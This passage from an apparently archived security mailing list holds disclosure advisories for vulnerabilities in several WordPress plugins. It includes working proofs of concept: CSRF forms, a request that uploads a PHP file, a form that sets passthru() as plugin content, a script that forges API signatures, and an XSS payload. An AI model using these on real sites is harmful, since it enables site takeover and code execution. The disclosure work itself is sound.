isset( $_POST['wc'] ) ) {
				$clauses = unserialize( base64_decode( $_POST['wc'] ) );

This issue can potentially result in arbitrary code execution, but this
has not been confirmed.

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/simple_ads_manager_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html
[2] https://wordpress.org/plugins/simple-ads-manager/
[3] https://www.owasp.org/index.php/PHP_Object_Injection
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
VaultPress - Remote Code Execution via Man in The Middle attack
------------------------------------------------------------------------
David Vaartjes, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Man in The Middle (MiTM) vulnerability has been identified in the
VaultPress plugin of WordPress. This issue allows an attacker to to
sniff clear-text communication and to run arbitrary PHP code on the
affected WordPress host.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160728-0002

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on VaultPress [2] WordPress Plugin
version 1.8.4

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The VaultPress plugin with site is a plugin that enables you to easily
backup your WordPress installation to the VaultPress cloud. In addition
it offers various security features, by scanning your WordPress system
for potential security issues.

A Man in The Middle (MiTM) vulnerability was found in the VaultPress [2]
plugin of WordPress. This issue allows an attacker to to sniff
clear-text communication and to run arbitrary PHP code on the affected
WordPress host.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
However SSL is used to communicate with the VaultPress backend
(www.vaultpress.com [3]), the SSL certificate is not verified. Because
of this it is possible for an attacker to sniff clear-text communication
and to run arbitrary PHP code on the affected WordPress host.

The VaultPress plugins communicates with the https://www.vaultpress.com
backend during registration, backups etcetera. Because the SSL
connection is not verified, a Man in The Middle can intercept, read and
modify traffic.

From a code perspective, when the query() method of the
VaultPress_IXR_SSL_Client class is called and the WP_Http class has been
defined, the sslverify attribute is set to false.

The vulnerable code in the
vaultpress/class.vaultpress-ixr-ssl-client.php file is listed below:


[..]
		if ( class_exists( 'WP_Http' ) ) {
			$args = array(
				'method' => 'POST',
				'body' => $xml,
				'headers' => $this->headers,
<b>-->				'sslverify' => false,</b>
				);
			if ( $this->timeout )
[..]


There are a number of ways a Man in The Middle can exploit this issue to
execute arbitrary code on a vulnerable WordPress host running
VaultPress.

------------------------------------------------------------------------
Attack vector targeting vulnerable instance during registration using
PHP's eval() function
------------------------------------------------------------------------
If the MiTM attack is executed during registration (happens only once)
the secret returned by the VaultPress server can be intercepted. Once
obtained, the key can be used to communicatie with the WordPress host's
exposed VaultPress API.

For example the following VaultPress API method allows to run any
specified PHP code remotely via eval().


[..]
		switch ( $_GET['action'] ) {
			default:
				die();
				break;
-->			case 'exec':
-->				$code = $_POST['code'];
				if ( !$code )
					$this->response( "No Code Found" );
-->				$syntax_check = @eval( 'return true;' . $code );
				if ( !$syntax_check )
					$this->response( "Code Failed Syntax Check" );
				$this->response( eval( $code . ';' ) );
				die();
				break;
[..]

The above code can be triggered using the following request:

POST /wp-load.php?vaultpress=true&action=exec HTTP/1.1
Host: <target>
Connection: close
Content-Length: 67
Content-Type: application/x-www-form-urlencoded
	
code=phpinfo();&signature=5f3db7516912e6b30422a17c1d0bf49beedd6de8:

Please note that a valid signature is required. To create it, the secret
value is needed, which seems to be exchanged during registration only.
So this only affects installations that were targeted by a MiTM during
registration.

The following little PHP script can be used to create the signature:

<?php
/**
** Generate Vaultpress API signature using MiTM'd secret
**/
	
$secret = "MITMD SECRET HERE";
$uri = "?vaultpress=true&action=exec";
$sig = ":";
$post = Array
(
	'code' => "phpinfo();",
);
	
ksort( $post );
$sig = explode( ':', $sig );
$to_sign = serialize( array( 'uri' => $uri, 'post' => $post ) );
$signature = hash_hmac( 'sha1', "$to_sign:", $secret );
	
echo "Signature :". $signature;
?>

------------------------------------------------------------------------
Attack vector targeting vulnerable instance after registration using
script injection
------------------------------------------------------------------------
If a MiTM attack is launched against a host which is already registered,
the secret value cannot be intercepted. However, during any
communication initiated by a user from the VaultPress plugin page (for
example during backups) messages are exchanged between the WordPress
host and the vaulpress.com backend. 

Responses from the server lack any encoding when shown in the plugin's
dashboard HTML pages. This allows a MiTM to inject scripting code in the
target user's WordPress Admin panel. Effectively this allows an attacker
to take over the WordPress admin account or to (indirectly) run
arbitrary PHP code on the WordPress host.

An example of objects lacking output encoding are the ui_message
objects. The vulnerable code in the vaultpress/vaultpress.php file is as
follows:

		<div id="vp-notice" class="vp-notice vp-<?php echo $type; ?> wrap
clearfix">
			<div class="vp-message">
-->				<h3><?php echo $heading; ?></h3>
-->				<p><?php echo $message; ?></p>
			</div>
		</div>


To exploit this the following XML (faultcode) can be returned using an
XML API call via a MiTM attack. Note the scripting code in the
faultString field.


<?xml version="1.0"?>
<methodResponse>
	<fault>
		<value>
			<struct>
				<member>
				   <name>faultCode</name>
				   <value><int>-5</int></value>
				</member>
				<member>
				   <name>faultString</name>
-->				  
<value><string><![CDATA[<script>alert("XSS");</script>]]></string></value>
				</member>
			</struct>
		</value>
	</fault>
</methodResponse>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/vaultpress___remote_code_execution_via_man_in_the_middle_attack.html
[2] https://wordpress.org/plugins/vaultpress/
[3] https://www.vaultpress.com
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
WordPress Adminer plugin allows public (local) database login
------------------------------------------------------------------------
David Vaartjes, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
The Adminer WordPress plugin allows public login to the site's editor.
As a result this allows an attacker to connect to any database running
on the local host or on internal systems which are accessible from the
target WordPress server.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160728-0001

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on the Adminer [2] WordPress Plugin
version 1.4.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
Currently no fix for this issue is available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Adminer WordPress plugin is a full-featured MySQL management tool
based on the Adminer project [3]. The plugin allows fast database
management for WordPress admins. After installation of the plugin your
database can be managed easily from within the WordPress Dashboard via
the Tools -> Adminer menu option. This issue allows an attacker to
connect to any database running on the local host or on internal systems
which are accessible from the target WordPress server.

Please note that an attacker still needs to login (for example using
username and password) to the target database. However, many site owners
probably do not know or do not expect that anyone out there can try to
login by using various password combinations to their (local) WordPress
database. Often local or internal databases have weak credentials
assigned to them.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue exists due to the fact that the Adminer WordPress plugin
exposes a publicly accessible interface (Adminer editor) that can be
used by anyone on the web to authenticate against the site’s database
directly. No login to the WordPress dashboard or admin login is
required. It seems that the Adminer editor component was added about 5
months ago.

An attacker can also specify the target host:port combination of the
database to connect to, which allows him to connect to any database
running on the local host or on internal systems which are accessible
from the target WordPress server.

The script has a measure in place to limit brute-force attacks. Upon 30
connection attempts from a single IP this IP will be blocked for 30
minutes.

The script can be found at the following location (change URL to your
WordPress site):
http://wp-site.com/wp-content/plugins/adminer/inc/editor/index.php

Using Google many sites can be found that have a publicly accessible
database login page exposed:
https://www.google.nl/search?q=inurl:/adminer/inc/ [4]

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
- http://<target>/wp-content/plugins/adminer/inc/editor/index.php
- http://<target>/wp-content/plugins/adminer/inc/editor/index.php?server=10.0.0.1&username=root&db=wordpress&password=root

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/wordpress_adminer_plugin_allows_public__local__database_login.html
[2] https://wordpress.org/plugins/adminer/
[3] https://www.adminer.org/en/editor/
[4] https://www.google.nl/search?q=inurl:/adminer/inc/
```

</details>

---

</details>
<details>
<summary><strong>[oss-security] Multiple Cross-Site Request Forgery vulnerabilities affecting various WordPress Plugins</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379271.2379_83.Morbo,U=38109:2,T -->

##### Summer of Pwnage <lists@securify.nl>, `63175610-a850-72d6-b3b1-928908d4d608@securify.nl`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Please see attached advisories for more information. These issues were 
found during Summer of Pwnage (https://sumofpwn.nl), a Dutch community 
project. Its goal is to contribute to the security of popular, widely 
used OSS projects in a fun and educational way.




```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Request Forgery in Atahualpa WordPress Theme
------------------------------------------------------------------------
Spyros Gasteratos, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross Site Request Forgery vulnerability exists in the Atahualpa
Wordpress theme which allows attackers to legitimate users into
performing unintended actions on the Atahualpa theme configuration page.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0003

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Atahualpa WordPress Theme [2]
WordPress Theme.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------

Atahualpa v3.7.24 has it's own Theme Options page where administrators
can set various options including changing the page's appearance or
injecting Javascript. The save button of this page doesn't include a
CSRF nonce token which gives attacker the ability to trick Wordpress
administrators into setting settings the attacker controls.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The theme's save configuration settings form doesn't include a Wordpress
CSRF nonce and consequently the script servicing the request doesn't
check for one. This allows the form to be submitted with preloaded
values as long as the browser sends a valid login cookie.

This allows attackers who lure legitimate users with an active Wordpress
session to an irrelevant website which submits the "Save Settings"
request to the user's Wordpress install. Since the request is towards a
domain for which the browser has cookies the legitimate cookies will be
submitted and the request will succeed.

The theme's configuration panel allows setting a variety of
configuration options including changes in the website's appearance as
well as appending Javascript in several areas. Attackers can use this
vulnerability to take over a Wordpress website.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
Install the  theme, login as admin and load the following csrf poc in
the same browser on another tab, when clicking "Submit" it will modify
the page footer.

<html>
	<body>
		<form
action="http://<target>/wp-admin/themes.php?page=atahualpa-options"
method="POST">
			<input type="hidden" name="footer_style"
value="background&#45;color&#58;&#32;&#35;ffffff&#59;&#13;&#10;border&#45;top&#58;&#32;dashed&#32;1px&#32;&#35;cccccc&#59;&#13;&#10;padding&#58;&#32;10000px&#59;&#13;&#10;text&#45;align&#58;&#32;center&#59;&#13;&#10;color&#58;&#32;&#35;777777&#59;&#13;&#10;font&#45;size&#58;&#32;95&#37;&#59;&#13;&#10;&#47;&#42;bye&#42;&#47;"/>
			<input type="hidden" name="footer_style_links"
value="text&#45;decoration&#58;&#32;none&#59;&#13;&#10;color&#58;&#32;&#35;777777&#59;&#13;&#10;font&#45;weight&#58;&#32;normal&#59;"/>
			<input type="hidden" name="footer_style_links_hover"
value="text&#45;decoration&#58;&#32;none&#59;&#13;&#10;color&#58;&#32;&#35;777777&#59;&#13;&#10;font&#45;weight&#58;&#32;normal&#59;"/>
			<input type="hidden" name="footer_style_content"
value="Copyright&#32;&amp;copy&#59;&#32;&#37;current&#45;year&#37;&#32;&#37;home&#37;&#32;&#45;&#32;All&#32;Rights&#32;Reserved"/>
			<input type="hidden" name="full_width_footer" value="No"/>
			<input type="hidden" name="sticky_layout_footer" value="No"/>
			<input type="hidden" name="footer_show_queries" value="No"/>
			<input type="hidden" name="save" value=""/>
			<input type="hidden" name="action" value="save"/>
			<input type="hidden" name="category" value="footer&#45;style"/>
			<input type="submit" value="Submit"/>
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_atahualpa_wordpress_theme.html
[2] https://wordpress.org/themes/atahualpa/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Request Forgery in File Manager WordPress plugin
------------------------------------------------------------------------
David Vaartjes, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Request Forgery (CSRF) vulnerability was found in the File
Manager WordPress Plugin. Among others, this issue can be used to upload
arbitrary PHP files to the server.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0029

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the File Manager [2] WordPress
Plugin version 3.0.1.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The File Manager [2] WordPress Plugin is a file manager for WordPress
which can be used to upload, delete, copy, move, rename, archive and
extract files without the need for FTP. It was discovered that the File
Manager WordPress Plugin is vulnerable to Cross-Site Request Forgery.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The upload form used by the plugin has no protection against CSRF
attacks. As a result an attacker can for example upload arbitrary PHP
files to the server.

Please note that the target user needs to be logged in.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The target parameter holds a Base64-encoded destination path. By using
the proof of concept request below a file named info.php is uploaded to
the /wp-content/uploads/file-manager/ directory.

When uploaded, this file can be requested from the outside as follows:
http://<wp-server>/wp-content/uploads/file-manager/info.php

Request:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: <wp-server>
Cookie: ALL_YOUR_WP_COOKIES
Connection: close
Content-Type: multipart/form-data;
boundary=---------------------------6427194103423794601262893907
	
-----------------------------6427194103423794601262893907
Content-Disposition: form-data; name="cmd"
	
upload
-----------------------------6427194103423794601262893907
Content-Disposition: form-data; name="target"
	
l1_d3AtY29udGVudC91cGxvYWRzL2ZpbGUtbWFuYWdlcg
-----------------------------6427194103423794601262893907
Content-Disposition: form-data; name="suffix"
	
~
-----------------------------6427194103423794601262893907
Content-Disposition: form-data; name="action"
	
connector
-----------------------------6427194103423794601262893907
Content-Disposition: form-data; name="upload[]"; filename="info.php"
Content-Type: text/php
	
<?php
phpinfo();
?>
-----------------------------6427194103423794601262893907--

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_file_manager_wordpress_plugin.html
[2] https://wordpress.org/plugins/file-manager/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Request Forgery in Global Content Blocks WordPress Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
It was discovered that the Global Content Blocks WordPress Plugin is
vulnerable to Cross-Site Request Forgery. Amongst others, this issue can
be used to update a content block to overwrite it with arbitrary PHP
code. Visiting a page or blog post that uses this content block will
cause the attacker's PHP code to be executed.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0031

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Global Content Blocks [2]
WordPress Plugin version 2.1.5.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Global Content Blocks [2] WordPress Plugin lets users create their
own shortcodes to insert reusable code snippets, PHP or HTML including
forms, opt-in boxes, iframes, Adsense code, etc, into pages and posts as
well as widgets and directly into php content. Global Content Blocks is
affected by Cross-Site Request Forgery.  Amongst others, this issue can
be used to update a content block to overwrite it with arbitrary PHP
code. Visiting a page or blog post that uses this content block will
cause the attacker's PHP code to be executed.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The issue exists due to the fact that Global Content Blocks does not use
the Cross-Site Request Forgery protection provided by WordPress. Actions
with Global Content Blocks have a predictable format, thus an attacker
can forge a request that can be executed by a logged in Administrator.
In order to exploit this issue, the attacker has to lure/force a logged
on WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The following proof of concept will update/overwrite the content block
with id 1. In order to run the attacker's PHP code, a page/blog needs to
be viewed that contains this content block (eg, [contentblock id=1]).

<html>
	<body>
		<form
action="http://<target>/wp-admin/options-general.php?page=global-content-blocks"
method="POST">
			<input type="hidden" name="gcb_view" value="update" />
			<input type="hidden" name="update_it" value="1" />
			<input type="hidden" name="gcb_name" value="Foo" />
			<input type="hidden" name="gcb_custom_id" value="" />
			<input type="hidden" name="gcb_type" value="php" />
			<input type="hidden" name="gcb_description" value="" />
			<input type="hidden" name="gcbvalue" value="passthru('ls -la');" />
			<input type="hidden" name="gcb_updateshortcode" value="Update" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_global_content_blocks_wordpress_plugin.html
[2] https://wordpress.org/plugins/global-content-blocks/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Request Forgery in WordPress Download Manager Plugin
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Request Forgery vulnerability has been found in the
WordPress Download Manager Plugin. By using this vulnerability an
attacker can change confidential settings of the plugin.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160722-0005

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on WordPress Download Manager [2]
version 2.8.99.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
WordPress Download Manager [2] is a Files / Documents Management Plugin
and Complete e-Commerce Solution for selling digital products. WordPress
Download Manager plugin will help you to manage, track, control file
downloads & sell digital products easily from your WordPress site. Use
Password Protection, User Roles Protection to control access to your
files. And simply setup prices when you need to sell the digital item.
User can directly download free items and when item has a price user
will have to go through cart & checkout. It has easiest checkout option
to give the user better experience in purchasing an item and which
always increase the probability of successful completion of an order. As
rather than trying to convince customer to buy something, it would be
more helpful to think of a cart optimization as an action to remove
barrier to that goal.

It was discovered that WordPress Download Manager is vulnerable to
Cross-Site Request Forgery. 

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The Download Manager plugin lacks a CSRF (nonce) token on the request of
saving settings. Because of this an attacker is able to change
confidential settings like file browser access and browser base dir by
luring a logged-in admin to follow a malicious link containing the proof
of concept below. 

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The proof of concept below gives file browser access to a user with
Editor privileges:
<html>
	<body>
		<form action="http://<target>/wp-admin/admin-ajax.php" method="POST">
			<input type="hidden" name="task" value="wdm_save_settings"/>
			<input type="hidden" name="action" value="wdm_settings"/>
			<input type="hidden" name="section" value="basic"/>
			<input type="hidden" name="wpdm_permission_msg" value="Access
Denied"/>
			<input type="hidden" name="wpdm_login_msg" value="<a
href='http://<target>/wp-login.php'>Please login to download</a>&#10;"/>
			<input type="hidden" name="_wpdm_file_browser_root"
value="/srv/www/wordpress-default/"/>
			<input type="hidden" name="_wpdm_file_browser_access[]"
value="editor"/>
			<input type="hidden" name="_wpdm_file_browser_access[]"
value="administrator"/>
			<input type="hidden" name="__wpdm_sanitize_filename" value="0"/>
			<input type="hidden" name="__wpdm_download_speed" value="4096"/>
			<input type="hidden" name="__wpdm_download_resume" value="1"/>
			<input type="hidden" name="__wpdm_support_output_buffer" value="1"/>
			<input type="hidden" name="__wpdm_open_in_browser" value="0"/>
			<input type="hidden" name="_wpdm_recaptcha_site_key" value=""/>
			<input type="hidden" name="_wpdm_recaptcha_secret_key" value=""/>
			<input type="hidden" name="__wpdm_disable_scripts[]" value=""/>
			<input type="hidden" name="__wpdm_login_url" value=""/>
			<input type="hidden" name="__wpdm_register_url" value=""/>
			<input type="hidden" name="__wpdm_user_dashboard" value=""/>
			<input type="submit"/>
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_download_manager_plugin.html
[2] https://wordpress.org/plugins/download-manager/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Gwolle Guestbook mass action vulnerable for Cross-Site Request Forgery
------------------------------------------------------------------------
Radjnies Bhansingh, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Request Forgery (CSRF) vulnerability was found in the
Gwolle Guestbook [2] WordPress plugin. This issue can be used by an
attacker to mass approve of disapprove entries. In order to exploit this
issue, the attacker needs to lure a victim with editor or admin
privileges to an attacker-controlled page or trick him into clicking a
malicous link. 

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0001

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the Gwolle Guestbook [2] WordPress
Plugin version 1.7.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue was fixed in Gwolle Guestbook version version 2.1.1. The most
recent version of Gwolle Guestbook can be obtained from the following
location:
https://wordpress.org/plugins/gwolle-gb/ [2]

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Gwolle Guestbook for WordPress is a guestbook made in order to provide
an easy and slim way to integrate a guestbook into your WordPress
powered site. Don't use your 'comment' section the wrong way - install
Gwolle Guestbook and have a real guestbook.

A Cross-Site Request Forgery vulnerability was found in Gwolle
Guestbook. This issue can be used by an attacker to mass approve of
disapprove entries. In order to exploit this issue, the attacker needs
to lure a victim with editor or admin privileges to an
attacker-controlled page or trick him into clicking a malicous link.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The Gwolle guestbook allows actions to be performed on multiple entries
at once (mass-action). Although actions performed on a single entry do
provide protection against Cross-Site Request Forgery (CSRF) by using
wp-nonces, mass-action lacks this protection. Since the entry IDs are
enumerable it allows an attacker to mass approve of disapprove entries.

------------------------------------------------------------------------
Proof of Concept
------------------------------------------------------------------------
The following proof of concept code demonstrates this issue:
<html>
	<body>
		<form
action="http://<target>/wordpress/wp-admin/admin.php?page=gwolle-gb%2Fentries.php"
method="POST">
			<input type="hidden" name="gwolle&#95;gb&#95;page" value="entries" />
			<input type="hidden" name="pageNum" value="1" />
			<input type="hidden" name="entriesOnThisPage" value="2" />
			<input type="hidden" name="show" value="all" />
			<input type="hidden" name="massEditAction1" value="check" />
			<input type="hidden" name="doaction" value="Apply" />
			<input type="hidden" name="check&#45;2" value="on" />
			<input type="hidden" name="check&#45;1" value="on" />
			<input type="hidden" name="massEditAction2" value="&#45;1" />
			<input type="hidden" name="" value="" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/gwolle_guestbook_mass_action_vulnerable_for_cross_site_request_forgery.html
[2] https://wordpress.org/plugins/gwolle-gb/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Popup by Supsystic WordPress plugin vulnerable to Cross-Site Request
Forgery
------------------------------------------------------------------------
Radjnies Bhansingh, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-site Request Forgery vulnerablity exists in the Popup by
Supsystic WordPress Plugin. This vulnerablity allows attackers to add
and modify scripting code that will target authenticated WordPress
admins or visitors that see the popup generated by this plugin. Before
exploitation of this issue succeeds, and scripting code is therefore
injected, a victim WordPress admin to click a specially crafted link or
visit a malicious attacker-controlled webpage. 

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0013

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the Popup by Supsystic [2]
WordPress plugin version 1.7.6.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The aim of the Popup by Supsystic [2] WordPress plugin is to help you
get more newsletter subscribers, promote new products, deliver special
offers and to get more social followers.

A Cross-site Request Forgery vulnerablity exists in the Popup by
Supsystic WordPress Plugin. This vulnerablity allows attackers to add
and modify scripting code that will target authenticated admins or
visitors that see the popup generated by this plugin. In order to
exploit this issue the target user must click a specially crafted link
or visit a malicious website (or advertisement).

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue exists because Popup by Supsystic lacks protection against
Cross-Site Request Forgery attacks. The following proof of concept code
demonstrates this issue:

<html>
	<body>
		<form action="http://<target>/wp-admin/admin-ajax.php" method="POST">
			<input type="hidden" name="params[main][show_on]" value="page_load"
/>
			<input type="hidden" name="params[main][show_on_page_load_delay]"
value="" />
			<input type="hidden" name="ppsCopyTextCode"
value="[supsystic-show-popup id=100]" />
			<input type="hidden" name="ppsCopyTextCode"
value="onclick=&quot;ppsShowPopup(100); return false;&quot;" />
			<input type="hidden" name="ppsCopyTextCode" value="#ppsShowPopUp_100"
/>
			<input type="hidden" name="params[main][show_on_click_on_el_delay]"
value="0" />
			<input type="hidden" name="params[main][show_on_scroll_window_delay]"
value="0" />
			<input type="hidden"
name="params[main][show_on_scroll_window_perc_scroll]" value="0" />
			<input type="hidden" name="ppsCopyTextCode" value="#ppsShowPopUp_100"
/>
			<input type="hidden" name="params[main][show_on_link_follow_delay]"
value="0" />
			<input type="hidden" name="ppsCopyTextCode"
value="[supsystic-popup-content id=100]" />
			<input type="hidden" name="params[main][close_on]" value="user_close"
/>
			<input type="hidden" name="params[main][show_pages]" value="all" />
			<input type="hidden" name="params[main][show_time_from]"
value="12:00am" />
			<input type="hidden" name="params[main][show_time_to]"
value="12:00am" />
			<input type="hidden" name="params[main][show_date_from]" value="" />
			<input type="hidden" name="params[main][show_date_to]" value="" />
			<input type="hidden" name="params[main][show_to]" value="everyone" />
			<input type="hidden"
name="params[main][show_to_first_time_visit_days]" value="30" />
			<input type="hidden"
name="params[main][show_to_until_make_action_days]" value="30" />
			<input type="hidden" name="params[main][count_times_num]" value="1"
/>
			<input type="hidden" name="params[main][count_times_mes]" value="day"
/>
			<input type="hidden" name="params[main][hide_for_devices_show]"
value="0" />
			<input type="hidden" name="params[main][hide_for_post_types_show]"
value="0" />
			<input type="hidden" name="params[main][hide_for_ips_show]" value="0"
/>
			<input type="hidden" name="params[main][hide_for_ips]" value="" />
			<input type="hidden" name="params[main][hide_for_countries_show]"
value="0" />
			<input type="hidden" name="params[main][hide_for_languages_show]"
value="0" />
			<input type="hidden" name="params[main][hide_search_engines_show]"
value="0" />
			<input type="hidden" name="params[main][hide_preg_url_show]"
value="0" />
			<input type="hidden" name="params[main][hide_preg_url]" value="" />
			<input type="hidden" name="params[main][hide_for_user_roles_show]"
value="0" />
			<input type="hidden" name="params[tpl][width]" value="400" />
			<input type="hidden" name="params[tpl][width_measure]" value="px" />
			<input type="hidden" name="params[tpl][bg_overlay_opacity]"
value="0.5" />
			<input type="hidden" name="params[tpl][bg_type_0]" value="color" />
			<input type="hidden" name="params[tpl][bg_img_0]" value="" />
			<input type="hidden" name="params[tpl][bg_color_0]" value="#8c7764"
/>
			<input type="hidden" name="params[tpl][bg_type_1]" value="color" />
			<input type="hidden" name="params[tpl][bg_img_1]" value="" />
			<input type="hidden" name="params[tpl][bg_color_1]" value="#75362c"
/>
			<input type="hidden" name="params[tpl][font_label]" value="default"
/>
			<input type="hidden" name="params[tpl][label_font_color]"
value="#ffffff" />
			<input type="hidden" name="params[tpl][font_txt_0]" value="default"
/>
			<input type="hidden" name="params[tpl][text_font_color_0]"
value="#f9e6ce" />
			<input type="hidden" name="params[tpl][font_footer]" value="default"
/>
			<input type="hidden" name="params[tpl][footer_font_color]"
value="#585858" />
			<input type="hidden" name="params[tpl][responsive_mode]" value="def"
/>
			<input type="hidden" name="params[tpl][reidrect_on_close]" value=""
/>
			<input type="hidden" name="params[tpl][close_btn]"
value="while_close" />
			<input type="hidden" name="params[tpl][bullets]" value="lists_green"
/>
			<input type="hidden" name="layered_style_promo" value="1" />
			<input type="hidden" name="params[tpl][layered_pos]" value="" />
			<input type="hidden" name="params[tpl][enb_label]" value="1" />
			<input type="hidden" name="params[tpl][label]" value="SIGN UP<br> to
our Newsletter!" />
			<input type="hidden" name="params[tpl][enb_txt_0]" value="1" />
			<input type="hidden" name="params_tpl_txt_0" value="<p>Popup by
Supsystic lets you easily create elegant overlapping windows with
unlimited features. Pop-ups with Slider, Lightbox, Contact and
Subscription forms and more</p>" />
			<input type="hidden" name="params[tpl][foot_note]" value="We respect
your privacy. Your information will not be shared with any third party
and you can unsubscribe at any time " />
			<input type="hidden" name="params[tpl][enb_sm_facebook]" value="1" />
			<input type="hidden" name="params[tpl][enb_sm_googleplus]" value="1"
/>
			<input type="hidden" name="params[tpl][enb_sm_twitter]" value="1" />
			<input type="hidden" name="params[tpl][sm_design]" value="boxy" />
			<input type="hidden" name="params[tpl][anim_key]" value="none" />
			<input type="hidden" name="params[tpl][anim_duration]" value="" />
			<input type="hidden" name="params[tpl][enb_subscribe]" value="1" />
			<input type="hidden" name="params[tpl][sub_dest]" value="wordpress"
/>
			<input type="hidden" name="params[tpl][sub_wp_create_user_role]"
value="subscriber" />
			<input type="hidden" name="params[tpl][sub_aweber_listname]" value=""
/>
			<input type="hidden" name="params[tpl][sub_aweber_adtracking]"
value="" />
			<input type="hidden" name="params[tpl][sub_mailchimp_api_key]"
value="" />
			<input type="hidden" name="params[tpl][sub_mailchimp_groups_full]"
value="" />
			<input type="hidden" name="test_email"
value="canzihazcandy@gmail.com" />
			<input type="hidden" name="params[tpl][sub_fields][name][enb]"
value="1" />
			<input type="hidden" name="params[tpl][sub_fields][name][name]"
value="name" />
			<input type="hidden" name="params[tpl][sub_fields][name][html]"
value="text" />
			<input type="hidden" name="params[tpl][sub_fields][name][label]"
value="Name" />
			<input type="hidden" name="params[tpl][sub_fields][name][value]"
value="" />
